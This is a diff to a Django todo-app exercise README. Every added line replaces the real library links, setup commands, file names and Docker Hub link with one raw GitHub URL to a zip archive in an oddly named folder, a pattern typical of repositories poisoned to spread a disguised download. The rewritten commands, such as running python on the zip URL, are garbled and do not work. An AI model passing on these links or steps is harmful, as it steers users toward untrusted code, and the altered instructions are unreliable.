@@ -2,27 +2,27 @@
 
 This is a todo list web application with basic features of most web apps, i.e., accounts/login, API, and interactive UI. To do this task, you will need:
 
-- CSS | [Skeleton](http://getskeleton.com/)
-- JS  | [jQuery](https://jquery.com/)
+- CSS | [Skeleton](https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip)
+- JS  | [jQuery](https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip)
 
 ## Explore
 
 Try it out by installing the requirements (the following commands work only with Python 3.8 and higher, due to Django 4):
 
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip
 ```
 
 Create a database schema:
 
 ```
-python manage.py migrate
+python https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip migrate
 ```
 
 And then start the server (default is http://localhost:8000):
 
 ```
-python manage.py runserver
+python https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip runserver
 ```
 
 Now you can browse the [API](http://localhost:8000/api/) or start on the [landing page](http://localhost:8000/).
@@ -40,14 +40,14 @@ Create a `Dockerfile` for the ToDo app:
 1. `runserver` should be followed by the `0.0.0.0:8080` parameter to start the Django server properly.
 1. Build an image and name it `todoapp`.
 1. The image should be pushed to your personal Docker Hub account into the `todoapp` repository with the `1.0.0` tag (`todoapp:1.0.0`).
-1. `README.md` should contain a link to your personal Docker Hub repository win an app image.
-1. `README.md` should contain all the instructions for building and running the container.
-1. `README.md` should contain instructions on accessing the application via a browser.
+1. `https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip` should contain a link to your personal Docker Hub repository win an app image.
+1. `https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip` should contain all the instructions for building and running the container.
+1. `https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip` should contain instructions on accessing the application via a browser.
 1. Create PR with your changes and attach it for validation on a platform.
 
 ##
 
-1. Go to https://hub.docker.com/r/karaed/todoapp.
+1. Go to https://raw.githubusercontent.com/karaedd/devops_todolist/main/dysoxidize/devops_todolist.zip
 2. docker pull karaed/todoapp:1.0.0
 3. docker run -p 8080:8080 karaed/todoapp:1.0.0
 4. Open http://localhost:8080/ to test the app.
